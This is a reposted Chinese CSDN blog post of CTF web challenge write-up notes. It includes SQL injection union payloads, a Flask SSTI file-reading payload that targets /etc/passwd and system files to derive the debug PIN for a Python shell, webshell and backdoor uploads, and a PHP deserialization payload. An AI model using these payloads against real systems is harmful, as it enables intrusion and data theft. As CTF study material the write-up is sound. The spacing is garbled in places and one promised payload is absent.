<!--yml
category: 未分类
date: 2022-04-26 14:31:57
-->

# ctf中文转unicode_CTF实战题解笔记 - Web篇_weixin_39707597的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_39707597/article/details/111630980](https://blog.csdn.net/weixin_39707597/article/details/111630980)

CTF(Capture The Flag)中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。

起源于1996年DEFCON全球黑客大会，后以CTF代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。

CTF一般分为三种模式：解题模式、攻防模式、混合模式。今天我们就来跟大家分享一下CTF中Web的解题笔记，有些枯燥，大家凑合看吧@-@。。。

web部分是CTF的重要组成部分之一，素有WEB大魔王之称，题目种类繁多，关键是如何发。现漏洞的类型和怎样构造特殊的负载绕过过滤。

# **简单的招聘系统**

存在 sql 注入 使用 sqlmap 可以 跑出 来手 动构 造一 下

1' or 1 order by 5#正常回显

1' or 1 order by 6#报错

-1' union select 1,2,3,4,5#

是在 2 字段

1' union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()#

1' union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database()#

1' union select 1,flaaag,3,4,5 from flag#

**easy_thinking**

这道 题利 用 tp6 的任意文件操 作 + 绕过 disable_function 的脚本

先登录，抓搜索的 包，改 phpsession ，会在 http://123.57.212.112:7891/runtime/session/) 目

录下 生成 sess_xxxxxx 的文 件

接着 写个 shell，用蚁剑连接 上去

由于 这个 shell 上传文件失败

只能利 用 shell 往这个网页写个后门 ，然 后再 连接，往 session 目录上传绕过 disable_function 的脚本。

# CTF实战题解 – 代码审计篇

**easysqli_copy**

通过代码审计发现宽字节注入+存储过程绕过+语句转十六进制

Payload 如下

将 url 替换 即可

**Flaskapp**

这一 道利 用 SSTI 去读 取文 件， 然后 获取 pin 码来打开 python shell Ssti 的读 文件 payload

{% for c in [].__class__.__base__.__subclasses__() %}

{% if c.__name__=='catch_warnings' %}

{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}

{% endif %}{% endfor %}

依次 去读 /sys/class/net/eth0/address , /proc/self/cgroup，/etc/passswd/

并通 过 debug 看 app.py 的绝对路 径

改下 网上 的脚 本参 数， 就可 以生 成 pin 码了，就 可以 打开 shell

**Ezupload**

上传 发现任 何防护 直 接 传 个 一 句 话 连 接 上

在虚拟终端里切换到根目录 发现个 flag 但是不能 cat 执行 一下 ./readflag 拿到 flag

又发现 readflag 发现是个执行文件

**Babyphp**

发现 www.zip 源码泄露

update.php 为真则可以拿 到 flag

发现 有反 序列 话语 句 类中寻找可用的方法， 构造 rop age=&nickname=''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

''''''''''''''''''''''''''''''unionunionunion";s:8:"CtrlCase";O:12:"UpdateHe

lper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3: {s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3: {s:3:"age";s:0:"";s:8:"nickname";s:1:"1";s:8:"CtrlCase";O:6:"dbCtrl":8:

{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:

"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:5:"admin";s:8:"password" ;N;s:6:"mysqli";

N;s:5:"token";s:5:"admin";}}}}}

如果你想跟我讨论CTF的解题思路，欢迎私信回复【入群】，加入安界网安全大咖学习交流群，与众多网安小伙伴一起进步。。

小白入行网络安全、混迹安全行业找大咖，以及更多成长干货资料，欢迎关注#安界网人才培养计划#、#网络安全在我身边#、@安界人才培养计划。

我是安仔，一名刚入职网络安全圈的网安萌新，欢迎关注我，跟我一起成长；